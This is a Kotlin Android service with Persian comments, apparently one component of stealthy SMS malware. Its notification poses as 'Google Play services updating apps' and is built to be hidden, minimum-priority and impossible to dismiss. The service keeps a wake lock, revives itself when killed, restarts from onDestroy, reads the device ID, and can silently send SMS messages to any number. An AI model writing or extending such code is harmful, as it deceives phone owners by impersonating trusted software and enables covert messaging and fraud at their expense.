package com.example.test

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.telephony.SmsManager
import android.util.Log
import androidx.core.app.NotificationCompat

class SmsService : Service() {

    private lateinit var deviceId: String
    private var isRunning = true
    private var pollingThread: Thread? = null
    private var wakeLock: PowerManager.WakeLock? = null

    companion object {
        private const val TAG = "SmsService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "sms_service_channel"
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "🚀 SmsService created")
        
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        
        // ⭐ WakeLock برای نگه داشتن دستگاه بیدار
        acquireWakeLock()
        
        startForegroundNotification()
    }

    /**
     * WakeLock برای جلوگیری از خوابیدن دستگاه
     */
    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "$TAG::WakeLock"
            )
            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
            Log.d(TAG, "✅ WakeLock acquired")
        } catch (e: Exception) {
            Log.e(TAG, "❌ WakeLock failed: ${e.message}")
        }
    }

    /**
     * نوتیفیکیشن هوشمندانه که شبیه Google Play Update است
     */
    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play services",  // ⭐ شبیه Google Play
                NotificationManager.IMPORTANCE_MIN  // ⭐ MIN برای مخفی بودن
            ).apply {
                description = "Google Play services keeps your apps up to date"
                setShowBadge(false)  // بدون Badge
                enableLights(false)
                enableVibration(false)
                setSound(null, null)  // بدون صدا
                lockscreenVisibility = Notification.VISIBILITY_SECRET  // مخفی در Lock Screen
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        // ⭐ نوتیفیکیشن عیناً شبیه Google Play
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play services")
            .setContentText("Updating apps...")
            .setSmallIcon(android.R.drawable.stat_sys_download)  // آیکون دانلود سیستمی
            .setPriority(NotificationCompat.PRIORITY_MIN)  // کمترین اولویت
            .setOngoing(true)  // نمیشه بست
            .setShowWhen(false)  // بدون زمان
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // مخفی
            .setCategory(NotificationCompat.CATEGORY_SERVICE)  // کتگوری سرویس
            .setSilent(true)  // بدون صدا
            .build()

        startForeground(NOTIFICATION_ID, notification)
        Log.d(TAG, "✅ Foreground service started")
    }

    private fun sendSms(phone: String, message: String) {
        try {
            SmsManager.getDefault().sendTextMessage(phone, null, message, null, null)
            Log.d(TAG, "✅ SMS sent to: $phone")
        } catch (e: Exception) {
            Log.e(TAG, "❌ SMS failed: ${e.message}", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "📞 onStartCommand called")
        
        // ⭐ START_STICKY: اگه سیستم کشتش، دوباره زنده میشه
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        
        Log.w(TAG, "⚠️ SmsService destroyed - Attempting restart...")
        
        isRunning = false
        pollingThread?.interrupt()
        
        // ⭐ آزاد کردن WakeLock
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                    Log.d(TAG, "✅ WakeLock released")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ WakeLock release failed: ${e.message}")
        }
        
        // ⭐ تلاش برای Restart خودکار
        try {
            val restartIntent = Intent(applicationContext, SmsService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restartIntent)
            } else {
                applicationContext.startService(restartIntent)
            }
            Log.d(TAG, "🔄 Restart scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Restart failed: ${e.message}")
        }
    }
}